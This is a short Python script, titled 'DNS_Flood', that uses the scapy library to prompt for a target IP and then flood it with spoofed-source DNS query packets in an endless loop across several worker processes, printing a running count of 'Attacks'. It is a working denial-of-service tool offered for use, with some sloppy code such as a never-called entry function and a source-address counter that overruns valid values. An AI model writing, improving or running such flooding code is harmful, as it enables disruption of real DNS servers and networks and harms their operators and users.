import scapy.all as scapy
from multiprocessing import Pool
import os

clear = os.system('clear')
print("**************************************")
print("             DNS_Flood")
print("**************************************")

print("Please input your target's IP ")
target = input("[DNS_Flood]#")

p ={}

def DNS_Flood_End():
	print("DNS_Flood_End")
	p.terminate()


def DNS_Flood(name):
	num = 0
	i=1
	
	try:
		while True:
			if (i > 0) is True:
				i+=1
				src_ip ="123.123.124."+str(i)

			packet = scapy.IP(src=src_ip,dst=target)/scapy.UDP(sport=scapy.RandShort(),dport=53)/scapy.DNS(rd=1,qd=scapy.DNSQR(qname="www.flood.com"))
			#packets = scapy.IP(src=src_ip,dst=target)/scapy.UDP(sport=scapy.RandShort(),dport=53)/scapy.DNS(rd=1,qd=scapy.DNSQR(qname="www.flood.com"))
			
			#scapy.srflood(packet)
			scapy.send(packet,count=1500,verbose=False)
			#scapy.send(packets,verbose=False)
			num += 1

			#if num == 1000:
			print("Process:%s,Attacks:%s"%(name,num))
			#print(num)
	except KeyboardInterrupt:
		print("[-] Ctrl + C detected.....")

def process():
	global p
	p = Pool(2)
	for i in range(3):
		p.apply_async(DNS_Flood,args=(i,))
	print('Waiting for all subprocesses done...')
	p.close()
	p.join()
	print('All subprocesses done.')

#DNS_Flood(process_id)
